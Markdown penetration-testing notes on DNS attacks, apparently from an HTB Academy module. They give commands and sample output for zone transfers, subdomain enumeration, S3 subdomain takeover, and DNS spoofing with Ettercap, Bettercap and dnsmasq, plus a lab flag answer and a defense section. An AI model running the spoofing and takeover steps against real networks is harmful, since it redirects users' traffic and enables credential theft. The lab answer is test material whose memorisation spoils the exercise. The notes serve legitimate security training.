# 🔓 DNS (Domain Name System) Attacks

## 🎯 Overview

This document covers **exploitation techniques** against DNS services, focusing on practical attack methodologies from HTB Academy's "Attacking Common Services" module. DNS attacks can lead to **information disclosure, domain takeover, traffic redirection, and man-in-the-middle attacks**.

> **"The Domain Name System (DNS) translates domain names (e.g., hackthebox.com) to the numerical IP addresses (e.g., 104.17.42.72). Since nearly all network applications use DNS, attacks against DNS servers represent one of the most prevalent and significant threats today."**

## 🏗️ DNS Attack Methodology

### Attack Chain Overview
```
Service Discovery → Zone Transfer Exploitation → Subdomain Enumeration → Domain Takeover → DNS Spoofing
```

### Key Attack Objectives
- **DNS zone transfers** for information gathering
- **Subdomain enumeration** to expand attack surface
- **Domain/subdomain takeover** for content control
- **DNS cache poisoning** for traffic redirection
- **DNS spoofing** for man-in-the-middle attacks

---

## 📍 Service Discovery & Enumeration

### Default DNS Port Detection
```bash
# Default DNS ports: UDP/53, TCP/53
# HTB Academy enumeration example
nmap -p53 -Pn -sV -sC 10.10.110.213

# Expected output
PORT    STATE  SERVICE     VERSION
53/tcp  open   domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
```

### Comprehensive DNS Scanning
```bash
# Full DNS service enumeration
nmap -p53 -sU -sV --script dns-* 10.10.110.213

# DNS version detection
nmap -p53 --script dns-nsid 10.10.110.213

# DNS recursion check
nmap -p53 --script dns-recursion 10.10.110.213
```

### Key Information to Extract
- **DNS server software** (BIND, Microsoft DNS, etc.)
- **Version information** for vulnerability research
- **Zone information** (SOA records)
- **Recursion capabilities**
- **DNS security features** (DNSSEC status)

---

## 🗄️ DNS Zone Transfer Attacks

### Understanding Zone Transfers
```
DNS Zone Transfer = Copy of DNS database from one server to another
Default behavior: No authentication required
Risk: Complete DNS namespace disclosure
Protocol: Uses TCP/53 for reliable transmission
```

### HTB Academy Zone Transfer Example

#### Using DIG for AXFR
```bash
# HTB Academy zone transfer attack
dig AXFR @ns1.inlanefreight.htb inlanefreight.htb

# Expected successful output
; <<>> DiG 9.11.5-P1-1-Debian <<>> axfr inlanefrieght.htb @10.129.110.213
;; global options: +cmd
inlanefrieght.htb.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
inlanefrieght.htb.         604800  IN      AAAA    ::1
inlanefrieght.htb.         604800  IN      NS      localhost.
inlanefrieght.htb.         604800  IN      A       10.129.110.22
admin.inlanefrieght.htb.   604800  IN      A       10.129.110.21
hr.inlanefrieght.htb.      604800  IN      A       10.129.110.25
support.inlanefrieght.htb. 604800  IN      A       10.129.110.28
inlanefrieght.htb.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 28 msec
;; SERVER: 10.129.110.213#53(10.129.110.213)
;; WHEN: Mon Oct 11 17:20:13 EDT 2020
;; XFR size: 8 records (messages 1, bytes 289)
```

#### Alternative Zone Transfer Methods
```bash
# Using nslookup
nslookup
> server ns1.inlanefreight.htb
> set type=any
> ls -d inlanefreight.htb

# Using host command
host -t axfr inlanefreight.htb ns1.inlanefreight.htb

# Using dnsrecon
dnsrecon -d inlanefreight.htb -t axfr
```

### Fierce for Comprehensive DNS Analysis
```bash
# HTB Academy Fierce example
fierce --domain zonetransfer.me

# Expected rich output
NS: nsztm2.digi.ninja. nsztm1.digi.ninja.
SOA: nsztm1.digi.ninja. (81.4.108.41)
Zone: success
{<DNS name @>: '@ 7200 IN SOA nsztm1.digi.ninja. robin.digi.ninja. 2019100801 '
               '172800 900 1209600 3600\n'
               '@ 300 IN HINFO "Casio fx-700G" "Windows XP"\n'
               '@ 301 IN TXT '
               '"google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA"\n'
               '@ 7200 IN MX 0 ASPMX.L.GOOGLE.COM.\n'
 <DNS name _acme-challenge>: '_acme-challenge 301 IN TXT '
                             '"6Oa05hbUJ9xSsvYy7pApQvwCUSSGgxvrbdizjePEsZI"',
 <DNS name cmdexec>: 'cmdexec 300 IN TXT "; ls"',
 <DNS name contact>: 'contact 2592000 IN TXT "Remember to call or email Pippa '
                     'on +44 123 4567890 or pippa@zonetransfer.me when making '
                     'DNS changes"',
 <DNS name email>: 'email 2222 IN NAPTR 1 1 "P" "E2U+email" "" '
                   'email.zonetransfer.me\n'
                   'email 7200 IN A 74.125.206.26',
```

---

## 🔍 Subdomain Enumeration & Domain Takeover

### Subdomain Discovery Techniques

#### HTB Academy Subfinder Example
```bash
# Subdomain enumeration with Subfinder
./subfinder -d inlanefreight.com -v

# Expected output
        _     __ _         _                                           
____  _| |__ / _(_)_ _  __| |___ _ _          
(_-< || | '_ \  _| | ' \/ _  / -_) '_|                 
/__/\_,_|_.__/_| |_|_||_\__,_\___|_| v2.4.5                                                                                                                                                                                                                                                 
                projectdiscovery.io                    

[INF] Enumerating subdomains for inlanefreight.com
[alienvault] www.inlanefreight.com
[dnsdumpster] ns1.inlanefreight.com
[dnsdumpster] ns2.inlanefreight.com
[bufferover] support.inlanefreight.com
[INF] Found 4 subdomains for inlanefreight.com in 20 seconds 11 milliseconds
```

#### Subbrute for Internal Networks
```bash
# HTB Academy Subbrute setup for internal use
git clone https://github.com/TheRook/subbrute.git
cd subbrute
echo "ns1.inlanefreight.com" > ./resolvers.txt

# DNS brute-forcing with custom resolvers
./subbrute inlanefreight.com -s ./names.txt -r ./resolvers.txt

# Output shows discovered subdomains
Warning: Fewer than 16 resolvers per process, consider adding more nameservers to resolvers.txt.
inlanefreight.com
ns2.inlanefreight.com
www.inlanefreight.com
ms1.inlanefreight.com
support.inlanefreight.com
```

### Domain Takeover Attacks

#### Understanding Subdomain Takeover
```
CNAME Record: sub.target.com → anotherdomain.com
Risk: If anotherdomain.com expires and is re-registered
Result: Attacker controls sub.target.com content
Common Targets: AWS S3, GitHub Pages, Heroku, Fastly
```

#### HTB Academy Takeover Example
```bash
# Check for vulnerable CNAME records
host support.inlanefreight.com

# Vulnerable response
support.inlanefreight.com is an alias for inlanefreight.s3.amazonaws.com

# Test for takeover vulnerability
curl https://support.inlanefreight.com

# Error indicating potential takeover
<Error>
<Code>NoSuchBucket</Code>
<Message>The specified bucket 'inlanefreight' does not exist</Message>
</Error>
```

#### Subdomain Takeover Detection Tools
```bash
# Using SubOver
python3 subover.py -l subdomains.txt

# Using can-i-take-over-xyz repository guidelines
# Check: https://github.com/EdOverflow/can-i-take-over-xyz

# Common vulnerable services:
# - AWS S3 buckets
# - GitHub Pages
# - Heroku apps
# - Azure websites
# - Fastly CDN
```

---

## 🕷️ DNS Spoofing & Cache Poisoning

### Understanding DNS Cache Poisoning
```
Goal: Alter legitimate DNS records with false information
Methods: 
  1. MITM attacks intercepting DNS traffic
  2. DNS server vulnerabilities exploitation
  3. Local network cache poisoning
Result: Traffic redirection to malicious servers
```

### HTB Academy Ettercap DNS Spoofing

#### Step 1: Configure DNS Spoofing
```bash
# Edit Ettercap DNS configuration
cat /etc/ettercap/etter.dns

# Add spoofing entries
inlanefreight.com      A   192.168.225.110
*.inlanefreight.com    A   192.168.225.110
```

#### Step 2: Execute MITM Attack
```bash
# Launch Ettercap GUI
ettercap -G

# Steps in Ettercap:
# 1. Hosts > Scan for Hosts
# 2. Add target IP (192.168.152.129) to Target1
# 3. Add gateway IP (192.168.152.2) to Target2
# 4. Plugins > Manage Plugins > dns_spoof
```

#### Step 3: Verify DNS Spoofing
```cmd
# From victim machine (192.168.152.129)
C:\>ping inlanefreight.com

Pinging inlanefreight.com [192.168.225.110] with 32 bytes of data:
Reply from 192.168.225.110: bytes=32 time<1ms TTL=64
Reply from 192.168.225.110: bytes=32 time<1ms TTL=64

# Browser test shows fake page hosted on 192.168.225.110
```

### Alternative DNS Spoofing Tools
```bash
# Using Bettercap
bettercap -iface eth0

# Bettercap commands
> set dns.spoof.domains inlanefreight.com
> set dns.spoof.address 192.168.225.110
> dns.spoof on
> arp.spoof on

# Using dnsmasq for local spoofing
echo "192.168.225.110 inlanefreight.com" >> /etc/dnsmasq_spoof.conf
dnsmasq --conf-file=/etc/dnsmasq_spoof.conf
```

---

## 🎯 HTB Academy Lab Scenarios

### Scenario 1: DNS Zone Transfer Exploitation
**Task**: Find all DNS records for "inlanefreight.htb" domain and submit flag found as DNS record

#### HTB Academy Solution Workflow

##### Step 1: Setup Subbrute Tool
```bash
# Clone subbrute repository
git clone https://github.com/TheRook/subbrute.git && cd subbrute/

# Expected output
Cloning into 'subbrute'...
remote: Enumerating objects: 438, done.
remote: Total 438 (delta 0), reused 0 (delta 0), pack-reused 438
Receiving objects: 100% (438/438), 11.85 MiB | 20.67 MiB/s, done.
Resolving deltas: 100% (216/216), done.
```

##### Step 2: Configure DNS Resolver
```bash
# Add target DNS server IP to resolvers file
echo STMIP > resolvers.txt

# Replace STMIP with actual target IP (e.g., 10.129.137.154)
```

##### Step 3: Subdomain Enumeration
```bash
# Use subbrute with SecLists wordlist
python3 subbrute.py inlanefreight.htb -s /opt/useful/SecLists/Discovery/DNS/namelist.txt -r resolvers.txt

# Expected output
Warning: Fewer than 16 resolvers per process, consider adding more nameservers to resolvers.txt.
inlanefreight.htb
helpdesk.inlanefreight.htb
hr.inlanefreight.htb
ns.inlanefreight.htb
```

##### Step 4: Zone Transfer on Discovered Subdomains
```bash
# Perform zone transfer on hr subdomain and search for TXT records
dig axfr hr.inlanefreight.htb @10.129.137.154 | grep "TXT"

# Successful flag extraction
hr.inlanefreight.htb.	604800	IN	TXT	"HTB{LUIHNFAS2871SJK1259991}"
```

**Answer**: `HTB{LUIHNFAS2871SJK1259991}`

#### Alternative Methods
```bash
# Method 1: Direct zone transfer
dig AXFR @target_dns_server inlanefreight.htb

# Method 2: Using fierce
fierce --domain inlanefreight.htb

# Method 3: Using dnsrecon
dnsrecon -d inlanefreight.htb -t axfr

# Method 4: Check all discovered subdomains
for sub in helpdesk hr ns; do
    echo "=== Checking $sub.inlanefreight.htb ==="
    dig AXFR @target_dns_server $sub.inlanefreight.htb
done
```

### Advanced DNS Reconnaissance
```bash
# Enumerate all record types
dig ANY @target_dns_server inlanefreight.htb

# Check for specific record types
dig TXT @target_dns_server inlanefreight.htb
dig MX @target_dns_server inlanefreight.htb
dig NS @target_dns_server inlanefreight.htb
dig PTR @target_dns_server inlanefreight.htb

# Brute force subdomains
gobuster dns -d inlanefreight.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

# Check for zone transfer on discovered subdomains
for sub in $(cat discovered_subdomains.txt); do
    dig AXFR @target_dns_server $sub.inlanefreight.htb
done
```

---

## 📋 DNS Attack Checklist

### Discovery & Enumeration
- [ ] **Port scanning** - UDP/53 and TCP/53 detection
- [ ] **Version enumeration** - DNS server software identification
- [ ] **Zone transfer testing** - AXFR query attempts
- [ ] **Recursion testing** - DNS resolver configuration
- [ ] **DNSSEC validation** - Security feature assessment

### Information Gathering
- [ ] **Subdomain enumeration** - Subfinder, Subbrute, Gobuster
- [ ] **DNS record analysis** - A, AAAA, CNAME, MX, TXT, NS records
- [ ] **Reverse DNS lookup** - PTR record enumeration
- [ ] **DNS cache snooping** - Cached record identification
- [ ] **DNS walking** - NSEC record exploitation

### Exploitation Techniques
- [ ] **Zone transfer exploitation** - Complete DNS data extraction
- [ ] **Subdomain takeover** - CNAME record vulnerability assessment
- [ ] **DNS cache poisoning** - MITM attack implementation
- [ ] **DNS tunneling** - Covert channel establishment
- [ ] **DNS amplification** - DDoS attack potential

### Post-Exploitation
- [ ] **Traffic monitoring** - DNS query analysis
- [ ] **Persistent spoofing** - Long-term redirection
- [ ] **Credential harvesting** - Fake login page hosting
- [ ] **Lateral movement** - Internal DNS server targeting

---

## 🛡️ Defense & Mitigation

### DNS Server Hardening
- **Disable zone transfers** - Restrict AXFR to authorized servers only
- **Enable DNSSEC** - Cryptographic DNS response validation
- **Implement access controls** - IP-based query restrictions
- **Regular updates** - Patch DNS server software
- **Rate limiting** - Prevent DNS amplification attacks

### Network Security
- **DNS filtering** - Block malicious domains
- **Encrypted DNS** - DNS over HTTPS (DoH) or DNS over TLS (DoT)
- **Split DNS** - Separate internal and external DNS
- **DNS monitoring** - Unusual query pattern detection
- **Cache poisoning protection** - Source port randomization

### Monitoring & Detection
- **Zone transfer attempts** - Log AXFR queries
- **Unusual DNS queries** - Detect reconnaissance patterns
- **DNS response validation** - Monitor for spoofed responses
- **Subdomain monitoring** - Track new subdomain creation
- **Certificate transparency** - Monitor SSL certificate logs

---

## 🔗 Related Techniques

- **[Subdomain Enumeration](../services/dns-enumeration.md)** - Information gathering techniques
- **[Domain Hijacking](../web-enumeration/domain-attacks.md)** - Web-based domain attacks
- **[Man-in-the-Middle](../network-attacks/mitm-attacks.md)** - Traffic interception
- **[Social Engineering](../social-engineering/)** - Phishing with spoofed domains
- **[Network Pivoting](../network-attacks/pivoting.md)** - Internal network access

---

## 📚 References

- **HTB Academy** - Attacking Common Services Module
- **RFC 1035** - Domain Names Implementation and Specification
- **OWASP DNS Security** - DNS attack vectors and mitigations
- **Subfinder Documentation** - Subdomain discovery tool
- **Ettercap Manual** - MITM attack framework
- **can-i-take-over-xyz** - Subdomain takeover reference

---

*This document provides comprehensive DNS attack methodologies based on HTB Academy's "Attacking Common Services" module, focusing on practical exploitation techniques for penetration testing and security assessment.* 